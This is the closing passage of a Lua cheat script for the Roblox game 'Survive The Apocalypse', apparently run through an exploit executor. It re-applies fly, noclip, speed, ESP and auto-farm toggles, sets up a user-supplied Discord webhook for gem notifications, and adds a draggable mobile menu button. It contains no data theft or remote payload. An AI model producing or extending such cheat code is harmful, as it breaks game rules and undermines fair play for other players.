    notify("Visuals", value and "PowerPlant ESP enabled" or "PowerPlant ESP disabled", 3)

end)



LocalPlayer.CharacterAdded:Connect(function()

    task.wait(0.5)

    createUnderMapPlate()

    if powerPlantESPEnabled then

        refreshPowerPlantESP()

        startESPRefreshLoop()

    end

    if Options.RainbowOutline and Options.RainbowOutline.Value then

        task.wait(0.3)

        startRainbowOutline()

    end

    if state.speedEnabled then

        startSpeed()

    end

    if state.flyEnabled then

        startFly()

    end

    if state.manualNoClipEnabled then

        startNoClip()

    end

    if state.pulseNoClipEnabled then

        startPulseNoClip()

    end

end)



Tabs.Settings:AddParagraph({

    Title = "Discord Webhook",

    Content = "Paste your Discord webhook URL to receive gem notifications."

})



Tabs.Settings:AddInput("WebhookURL", {

    Title = "Webhook URL",

    Default = "",

    Placeholder = "https://discord.com/api/webhooks/...",

    Numeric = false,

    Finished = true,

    Callback = function(value)

        webhookURL = value

        if value ~= "" then

            notify("Webhook", "Webhook URL set!", 3)

        end

    end

})



Tabs.Settings:AddButton({

    Title = "Test Webhook",

    Description = "Send a test message to your webhook",

    Callback = function()

        if webhookURL == "" then

            notify("Webhook", "Set a webhook URL first!", 3)

            return

        end

        sendWebhook(0, totalGemsCollected)

        notify("Webhook", "Test sent!", 3)

    end

})



SaveManager:SetLibrary(Fluent)

InterfaceManager:SetLibrary(Fluent)

SaveManager:IgnoreThemeSettings()

SaveManager:SetIgnoreIndexes({})

InterfaceManager:SetFolder("FluentScriptHub")

SaveManager:SetFolder("FluentScriptHub/survive-the-apo")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)

SaveManager:BuildConfigSection(Tabs.Settings)



Window:SelectTab(1)

createUnderMapPlate()

notify("Survive The Apo", "Script loaded", 5)

-- Apply _G.Settings directly (no SaveManager override)
do
    local cfg = _G.Settings
    if cfg then
        if cfg.WebhookURL and cfg.WebhookURL ~= "" then
            webhookURL = cfg.WebhookURL
        end

        local toggleMap = {
            AutoPowerPlant = "PowerPlantEnabled",
            AutoStartMatch = "AutoStartMatch",
            Fly = "FlyEnabled",
            NoClip = "NoClipEnabled",
            PulseNoClip = "PulseNoClipEnabled",
            Speed = "SpeedEnabled",
            RainbowOutline = "RainbowOutline",
            Fullbright = "FullbrightEnabled",
            NoFog = "NoFogEnabled",
            PowerPlantESP = "PowerPlantESPEnabled",
            DeleteMap = "DeleteMap",
            GemDisplay = "GemDisplay",
            Disable3DRender = "Disable3DRender",
            RedeemCode = "RedeemCode",
            SignUpQuest = "SignUpQuest",
            UnlockFog = "UnlockFog",
            LimitTimer = "LimitTimer",
        }

        for settingKey, optionKey in pairs(toggleMap) do
            if cfg[settingKey] == true then
                task.spawn(function()
                    pcall(function()
                        if Options[optionKey] then
                            Options[optionKey]:SetValue(true)
                        end
                    end)
                end)
            end
        end
        notify("Config", "All _G.Settings applied", 3)
    end
end

print("Script loaded successfully! V.3.0")

-- Mobile Toggle Button: small draggable circle to open/close UI
do
    local TweenService = game:GetService("TweenService")
    local UIS = game:GetService("UserInputService")

    -- Find the Fluent ScreenGui
    local fluentGui = nil

    -- Try Fluent.Root -> walk up to ScreenGui
    pcall(function()
        if Fluent and Fluent.Root and typeof(Fluent.Root) == "Instance" then
            local obj = Fluent.Root
            while obj do
                if obj:IsA("ScreenGui") then fluentGui = obj break end
                obj = obj.Parent
            end
        end
    end)

    -- Try Window table for Instance -> walk up
    if not fluentGui then
        pcall(function()
            for _, val in pairs(Window) do
                if typeof(val) == "Instance" then
                    local obj = val
                    while obj do
                        if obj:IsA("ScreenGui") then fluentGui = obj break end
                        obj = obj.Parent
                    end
                    if fluentGui then break end
                end
            end
        end)
    end

    -- Brute force: search gethui / CoreGui / PlayerGui
    if not fluentGui then
        local containers = {}
        pcall(function() if typeof(gethui) == "function" then table.insert(containers, gethui()) end end)
        pcall(function() table.insert(containers, game:GetService("CoreGui")) end)
        pcall(function() table.insert(containers, game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")) end)
        for _, container in ipairs(containers) do
            if fluentGui then break end
            pcall(function()
                for _, gui in ipairs(container:GetChildren()) do
                    if gui:IsA("ScreenGui") and gui.Name ~= "MobileToggle" then
                        for _, desc in ipairs(gui:GetDescendants()) do
                            if desc:IsA("TextLabel") and desc.Text and desc.Text:find("Survive the Apocalypse") then
                                fluentGui = gui
                                break
                            end
                        end
                        if fluentGui then break end
                    end
                end
            end)
        end
        if not fluentGui then
            for _, container in ipairs(containers) do
                if fluentGui then break end
                pcall(function()
                    for _, gui in ipairs(container:GetChildren()) do
                        if gui:IsA("ScreenGui") and gui.Name ~= "MobileToggle" then
                            fluentGui = gui
                            break
                        end
                    end
                end)
            end
        end
    end

    notify("Toggle", fluentGui and ("Found UI: " .. fluentGui.Name) or "UI not found", 5)

    local guiParent = (fluentGui and fluentGui.Parent) or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

    local toggleGui = Instance.new("ScreenGui")
    toggleGui.Name = "MobileToggle"
    toggleGui.ResetOnSpawn = false
    toggleGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    toggleGui.DisplayOrder = 999
    toggleGui.IgnoreGuiInset = true
    pcall(function() toggleGui.Parent = guiParent end)
    if not toggleGui.Parent then
        toggleGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    end

    local btn = Instance.new("TextButton")
    btn.Name = "ToggleBtn"
    btn.Size = UDim2.fromOffset(46, 46)
    btn.Position = UDim2.new(0.5, -23, 0, 120)
    btn.AnchorPoint = Vector2.new(0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(30, 160, 60)
    btn.BackgroundTransparency = 0.15
    btn.Text = "☰"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 22
    btn.Font = Enum.Font.GothamBold
    btn.AutoButtonColor = false
    btn.Parent = toggleGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = btn

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 100, 255)
    stroke.Thickness = 2
    stroke.Transparency = 0.5
    stroke.Parent = btn

    local dragging = false
    local dragStart, startPos
    local hasMoved = false

    btn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            hasMoved = false
            dragStart = input.Position
            startPos = btn.Position
        end
    end)

    btn.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            if delta.Magnitude > 5 then hasMoved = true end
            btn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    local uiVisible = true
    local function setUIVisible(visible)
        uiVisible = visible
        if fluentGui then fluentGui.Enabled = visible end
        btn.BackgroundColor3 = visible and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(30, 160, 60)
        btn.Text = visible and "✕" or "☰"
        local col = visible and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(100, 100, 255)
        TweenService:Create(stroke, TweenInfo.new(0.2), {Color = col}):Play()
        TweenService:Create(btn, TweenInfo.new(0.15, Enum.EasingStyle.Back), {Size = UDim2.fromOffset(42, 42)}):Play()
        task.delay(0.15, function()
            TweenService:Create(btn, TweenInfo.new(0.15, Enum.EasingStyle.Back), {Size = UDim2.fromOffset(46, 46)}):Play()
        end)
    end

    btn.MouseButton1Click:Connect(function()
        if hasMoved then return end
        setUIVisible(not uiVisible)
    end)

    task.delay(1, function()
        setUIVisible(false)
    end)
end
print("Script loaded successfully! V.4.6")
